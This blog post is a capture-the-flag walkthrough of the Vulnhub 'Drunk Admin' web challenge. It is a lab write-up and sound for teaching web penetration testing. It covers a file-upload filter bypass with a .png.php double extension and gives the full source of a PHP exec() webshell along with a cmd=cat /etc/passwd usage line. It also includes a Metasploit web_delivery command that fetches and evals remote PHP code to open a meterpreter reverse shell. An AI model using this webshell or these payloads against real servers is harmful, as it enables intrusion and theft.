Welcome to my new blog! Let's dive into a Web hacking challenge for this first post.

<img src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/challenge-drunk-admin.jpg" alt="challenge-drunk-admin.jpg" style="float: left; padding: 15px">

I am mostly focusing on Web challenges these days because I'm trying to improve my web app pentest checklist.
I stumbled upon this challenge on <a href="https://www.vulnhub.com/entry/drunk-admin-web-hacking-challenge-1,14/">Vulnhub</a> and was attracted to the funny title.

Now let's see what this drunk admin has in stock for us!

### Goal

The goal of this challenge is to "Reveal the hidden message for a date arrange that Bob sent to Alice".

### Finding the target VM's IP address

Here is how I get the IP address of a challenge VM that has DCHP enabled. First, I take note of my IP address (*i.e.* the  IP of the Kali VM I am using):
```console
# ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.217.3  netmask 255.255.255.0  broadcast 192.168.217.255
        inet6 fe80::a00:27ff:fee5:35c7  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:e5:35:c7  txqueuelen 1000  (Ethernet)
        RX packets 381  bytes 51468 (50.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 58  bytes 9908 (9.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Then I scan the whole network to get the target VM's IP address:
```console
# nmap -sn 192.168.217.1-254

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-15 14:11 CET
Nmap scan report for 192.168.217.1
Host is up (0.00012s latency).
MAC Address: 0A:00:27:00:00:05 (Unknown)
Nmap scan report for 192.168.217.6
Host is up (0.0021s latency).
MAC Address: 08:00:27:FB:B4:15 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.217.3
Host is up.
Nmap done: 254 IP addresses (4 hosts up) scanned in 2.02 seconds
```

As you can see, I have 3 IP addresses on my Virtualbox Host only network:
- 192.168.217.1: Windows host
- 192.168.217.3: Kali Linux "attack" VM
- **192.168.217.6: _Drunk admin_ VM**

### Port scanning

The target has only two open TCP ports: 22/tcp (ssh) and 8880/tcp (http).

```console
# nmap -n -A -p- 192.168.217.6

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-15 14:15 CET

### Reconnaissance phase

#### Manual browsing

The first thing to do after discovering an HTTP open port, is to manually browse the application and take note of all interesting functionalities and URLs.

At first sight, only two pages are available: /index.php and /info.php.

<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/home_page.PNG" alt="home_page.png">

There is a file upload functionality which we'll have to test later, after we are done with the recon phase.

#### Automatic scanning

The next step is to scan the application with automatic tools in order to find any other hidden resources.
For that, I usually use:
- <u>Burp spider</u> to find links referenced in the application's source code
- <u>Dirb</u> for file and directory brute-forcing to find links not referenced anywhere

**Burp spider**

Spidering reveals two new files:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_spider.PNG" alt="burp_spider.png">

<http://192.168.217.6:8880/myphp.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000>
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php_credits.PNG" alt="php_credits.png">

<http://192.168.217.6:8880/myphp.php?id=102>
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php_credits_102.PNG" alt="php_credits_102.png">

Leaving default PHP files on a Web server is bad practice. In this case, they do not contain any sensitive information but one of them leads to a technical information disclosure vulnerability, as we will see below.

Every time I see a numerical ID, I like trying other values in case the IDs have incremental values. Burp Intruder is a great tool for this test.

Here is the attack setup:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_intruder_1.PNG" alt="burp_intruder_1.png">

<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_intruder_2.PNG" alt="burp_intruder_2.png">

And the results:

<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_intruder_3.PNG" alt="burp_intruder_3.png">

All ID values return a 200 HTTP response code, but sorting responses by length shows that some values give a different response size.
Most responses have the length 345 bytes that corresponds to the following message:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_intruder_4.PNG" alt="burp_intruder_4.png">

But some ID values (99, 101, 102, 104, 108, 116, 132 and 164) return interesting PHP pages, some of which reveal information like the PHP version used, Apache and PHP configurations:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_intruder_5.PNG" alt="burp_intruder_5.png">

A very useful piece of information revealed is the list of PHP functions that are disabled:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_intruder_6.PNG" alt="burp_intruder_6.png">
In case the file upload functionality previously detected has a vulnerability that allows uploading and executing PHP code, this list would help save time by only trying enabled PHP functions.

**Dirb**

Dirb finds several new files:

```console

# dirb http://192.168.217.6:8880 /usr/share/dirb/wordlists/common.txt -o dirb.log

Here is how to extract all URLs that gave a 200 HTTP response code and also directories found from Dirb's output:

```

It is best to check directories too (and not only files with a 200 response code) to be able to detect directories that have directory listing enabled.


Let's then use Eyewitness to quickly take a screenshot of all these URLs:

```console

```

This tools is very handy, it generates an HTML report file containing a screenshot of each URL passed to it:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/eyewitness.PNG" alt="eyewitness.png">

The URL <http://192.168.217.6:8880/images/test> is noteworthy because it mentions a "secret code":
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/secret_code.PNG" alt="secret_code.png">

We don't known what to do with it yet, so let's note it and put it aside for now.

At this point, I stumbled upon something weird: I don't even remember why, but I tried opening <http://192.168.217.6:8880/images/bob/> in a browser. This directory was accessible and directory listing was enabled on it:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/directory_listing_1.PNG" alt="directory_listing_1.png">

This is weird because Eyewitness returned a 403 Forbidden page for that same URL (I checked twice!).
After investigating with Burp, I realized that Eyewitness got a 403 error because the page can only be accessed when the right cookie (*trypios*) is included in the request:

<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/directory_listing_3.PNG" alt="directory_listing_3.png">

The cookie is automatically created by the server when the URL <http://192.168.217.6:8880/myphp.php?id=102> is visited:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/directory_listing_2.PNG" alt="directory_listing_2.png">

So to sum up, there is a directory listing vulnerability on <http://192.168.217.6:8880/images/bob/>, but you have to include the header "Cookie: trypios=nop" to access this directory and all pages inside it.

### Exploiting the directory listing

The URL <http://192.168.217.6:8880/images/bob/public_html/> is very interesting:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/secret_form_1.PNG" alt="secret_form_1.png">

It reminds me of the secret code found previously: `TGglMUxecjJDSDclN1Ej`.

Entering it directly does not seem to work:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/secret_form_2.PNG" alt="secret_form_2.png">

Maybe it is encoded? Let's try decoding it base64 and entering the decoded value:
```console
# echo TGglMUxecjJDSDclN1Ej | base64 -d
Lh%1L^r2CH7%7Q#
```

<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/secret_form_3.PNG" alt="secret_form_3.png">

Yes, it works!

The location '35.517286' '24.017637' points to "Akti Tompazi 4, Chania 731 32, Greece" which is where Alice and Bob are meeting:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/gps.PNG" alt="gps.png">

I do not think however that the directory listing vulnerability is the intended way to solve this challenge. The walkthrough published by its <a href="http://bechtsoudis.com/data/challenges/ispoglou_drunk_admin_solution.txt">creator</a> does not mention this vulnerability.

So now, let's focus on the file upload functionality! There may be another vulnerability there.

### Testing the file upload functionality

#### Analyzing the normal behavior
Before anything, let's upload a valid image and analyze how the server behaves under normal conditions:

<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/file-upload-valid-png-1.PNG" alt="file-upload-valid-png-1.png"> 
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/file-upload-valid-png-2.PNG" alt="file-upload-valid-png-2.png">

The location of the image is <http://192.168.217.6:8880/images/e58706c74d2bf10964d0196b85e4d485.png>.

Notice that the filename was changed from cat.png to e58706c74d2bf10964d0196b85e4d485.png.

If we upload the same image a second time, the server renames it again with the same value. This means that the new filename is not based on a unique value like the time of upload.
So maybe we can guess the meaning of this new name.

e58706c74d2bf10964d0196b85e4d485 looks like an encoded value. *Hash-identifier* shows that it is probably an MD5 hash:
```console
# hash-identifier 
   #########################################################################
   #	 __  __ 		    __		 ______    _____	   #

   #								 By Zion3R #
   #							www.Blackploit.com #
   #						       Root@Blackploit.com #
   #########################################################################

   -------------------------------------------------------------------------
 HASH: e58706c74d2bf10964d0196b85e4d485

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Let's try encoding the original filename in MD5:
```console
# echo -n "cat" | md5sum
d077f244def8a70e5ea758bd8352fcd8  -
# echo -n "cat.png" | md5sum
e58706c74d2bf10964d0196b85e4d485  -
```

That's it! The new filename is nothing but the MD5 hash of the original filename (extension included).

#### Identifying filters and attempting to bypass them

Now let's upload different unexpected files to see what sort of verifications are implemented on the server.

The PHP file we will work with is the following:
```console
# cat php_file.php
<?php
  echo phpversion();
?>
```

##### file.php
Uploading PHP files is not allowed:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/invalid_extension.PNG" alt="invalid_extension.png">

##### file.pHp
The .pHp extension gives the same "Invalid file extension!" error.

##### file.php.png
Files with the .php.png double extension are uploaded but they are not executed as PHP files. This is normal because they ARE images, with a .png extension and an image [MIME type](https://en.wikipedia.org/wiki/Media_type).
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_1.PNG" alt="php-png-upload_1.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_2.PNG" alt="php-png-upload_2.png">

If we upload the same .php.png file, intercept it with Burp and change its extension to .php to make it executable as PHP code, we get an "Invalid file extension!" error:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_3.PNG" alt="php-png-upload_3.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_4.PNG" alt="php-png-upload_4.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/invalid_extension.PNG" alt="invalid_extension.png">

If we upload the same .php.png file, intercept it with Burp and, this time, only change the MIME type (not the extension), the file is again uploaded but not executed as PHP code:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_3.PNG" alt="php-png-upload_3.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_5.PNG" alt="php-png-upload_5.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_6.PNG" alt="php-png-upload_6.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_7.PNG" alt="php-png-upload_7.png">

The results we get from three tests mean that only the file's extension matters: it must contain an image extension like .png or .jpg.\\
This is important to know because we need to understand exactly what filters are in place (extension check, size check, MIME type check, content check...) before attempting to bypass them.

##### file.php%00.png

Using the NULL byte injection technique does not work either. Once again, the file is uploaded but not executed as PHP:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_8.PNG" alt="php-png-upload_8.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_9.PNG" alt="php-png-upload_9.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_10.PNG" alt="php-png-upload_10.png">

##### file.png.php
Let's try a different double extension:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_11.PNG" alt="php-png-upload_11.png">
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_12.PNG" alt="php-png-upload_12.png">

This is weird! The file is uploaded but we do not see the broken image link like before. Since we know how the server generates the new filenames, we can guess our filename:

```console
#  echo -n "php_file.png.php" | md5sum
c53d15af2ef1513bd872612143c0adc8  -
```
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/php-png-upload_13.PNG" alt="php-png-upload_13.png">
This time, our PHP code is executed!

This is good, now that we have a working [PoC](https://en.wikipedia.org/wiki/Proof_of_concept), we can upload a webshell.

#### Exploiting the file upload vulnerability

**Simple PHP webshell**

Remember, we previously found that several PHP functions are disabled including *system*, *passthru* and *shell_exec*:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/burp_intruder_6.PNG" alt="burp_intruder_6.png">
The exec function is not listed as disabled, so let's try it.

We can use a modified version of one of the webshells present by default on Kali Linux:
```console
# cp /usr/share/webshells/php/simple-backdoor.php php_file.png.php
# nano php_file.png.php 
<!-- Inspired by DK's Simple PHP backdoor (http://michaeldaw.org) -->
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $results = exec($cmd);
	echo $results;
        echo "</pre>";
        die;
}
?>
Usage: http://192.168.217.6:8880/images/c53d15af2ef1513bd872612143c0adc8.php?cmd=cat+/etc/passwd
```

The webshell is working but only the first line of the results is displayed:
<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/webshell_1.PNG" alt="webshell_1.png">

This limitation can be easily bypassed with a for loop to display the `$results` variable's contents:
```console
# nano php_file.png.php 
<!-- Inpired by DK's Simple PHP backdoor (http://michaeldaw.org) -->
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        exec($cmd, $results);
        foreach( $results as $r )
        {
                echo $r."<br/>";
        }
        echo "</pre>";
        die;
}
?>

Usage: http://192.168.217.6:8880/images/c53d15af2ef1513bd872612143c0adc8.php?cmd=cat+/etc/passwd
```

<img class="center" src="{{ site.baseurl }}/assets/img/challenges/drunk-admin/webshell_2.PNG" alt="webshell_2.png">

**Meterpreter session**\\
Meterprer sessions are more practical to use. So let's leverage the previous simple PHP webshell to obtain one:
```console
msf > use multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set target 1
target => 1
msf exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set lhost  192.168.217.3
lhost => 192.168.217.3
msf exploit(multi/script/web_delivery) > set srvport 9876
srvport => 9876
msf exploit(multi/script/web_delivery) > set lhost  192.168.217.3
lhost => 192.168.217.3
msf exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.217.3:4444 
msf exploit(multi/script/web_delivery) > [*] Using URL: http://0.0.0.0:9876/sDt4R1u1b
[*] Local IP: http://10.0.2.15:9876/sDt4R1u1b
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.217.3:9876/sDt4R1u1b'));"
```

We just have to run the command displayed by Metasploit on the server via the simple webshell:
<http://192.168.217.6:8880/images/c53d15af2ef1513bd872612143c0adc8.php?cmd=php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.217.3:9876/sDt4R1u1b'));">

Then let's go back to Metasploit where a Meterpreter session (on the remote server) should be created:
```console
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.217.3:9876/sDt4R1u1b'));"
[*] 192.168.217.6    web_delivery - Delivering Payload
[*] Sending stage (37543 bytes) to 192.168.217.6
[*] Meterpreter session 1 opened (192.168.217.3:4444 -> 192.168.217.6:60606) at 2018-02-21 15:38:23 +0100
sessions -i 1
[*] Starting interaction with 1...

meterpreter > pwd
/var/www/images
```

**Post-exploitation**\\
The `/var/www/` folder is the server's Web root as confirmed by `/etc/apache2/sites-enabled`.
It contains several files seen previously when we manually browsed the Web application:
```console
meterpreter > ls
Listing: /var/www

A hidden file, containing a "Secret code" is also there:
```console
meterpreter > cat .proof
#########################

bob> Great work.
bob> Meet me there.

bob> What? You don't know where?
bob> Work a little more your post
     exploitation skills.

Secret Code:

Mail me your methods at:
anestis@bechtsoudis.com
```

After rummaging through `/var/www/images/`, one folder stands out because it contains a form that'll "Reveal My Secret":
```console
meterpreter > ls public_html/
Listing: public_html/
=====================

100644/rw-r--r--  791   fil   2018-02-12 16:28:09 +0100  index.php

meterpreter > cat public_html/index.php
<?php 
require 'include/aes.class.php';
require 'include/aesctr.class.php';
  
$cipher = 'bf0OvfUkVk+AJq8e+jbVlDdCYQoNVa9/eCCt+3y6qLb8jPdH6O43QlxAo80H2EASR8UKH9zVHDQ2aHZUoahc7dqTcGRcwCURwBWWew==';

if(isset($_POST['sc']) && isset($_POST['decr'])) {
    $decr = AesCtr::decrypt($cipher, $_POST['sc'], 256);
    echo $decr;
    die;
}
?>   

<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Bob's Secret Messages</title>
</head>
<body>
<form name="form" id="form" method="post" action="">
  <table>  
    <tr>
      <td>Secret:</td>
      <td><input type="text" name="sc" size="16"></td>
    </tr>
    <tr>
      <td><input type="submit" name="decr" value="Reveal My Secret:"></td>
    </tr>
  </table>
</form>
</body>
</html>
```

Now all we have to do is download the `public_hml` folder and run it on a local Web server:
```console
meterpreter > cd bob
meterpreter > download -f public_html
[*] downloading: public_html/encrypt.php -> public_html/encrypt.php
[*] download   : public_html/encrypt.php -> public_html/encrypt.php
[*] downloading: public_html/index.php -> public_html/index.php
[*] download   : public_html/index.php -> public_html/index.php
[*] mirroring  : public_html/include -> public_html/include
[*] downloading: public_html/include/aesctr.class.php -> public_html/include/aesctr.class.php
[*] download   : public_html/include/aesctr.class.php -> public_html/include/aesctr.class.php
[*] downloading: public_html/include/aes.class.php -> public_html/include/aes.class.php
[*] download   : public_html/include/aes.class.php -> public_html/include/aes.class.php
[*] downloading: public_html/include/index.html -> public_html/include/index.html
[*] download   : public_html/include/index.html -> public_html/include/index.html
[*] mirrored   : public_html/include -> public_html/include
```

Here's how to start a local PHP server that will serve the `public_html` folder (the one downloaded from the vulnerable server):
```console
# cd public_html/
# php -S localhost:8000
PHP 7.2.2-1 Development Server started at Wed Feb 21 16:25:25 2018
Listening on http://localhost:8000
Document root is /usr/share/metasploit-framework/public_html
Press Ctrl-C to quit.
```

From here, the method for finding where Alice and Bob are meeting is the same as covered in the ["Exploiting the directory listing"](#exploiting-the-directory-listing) section.
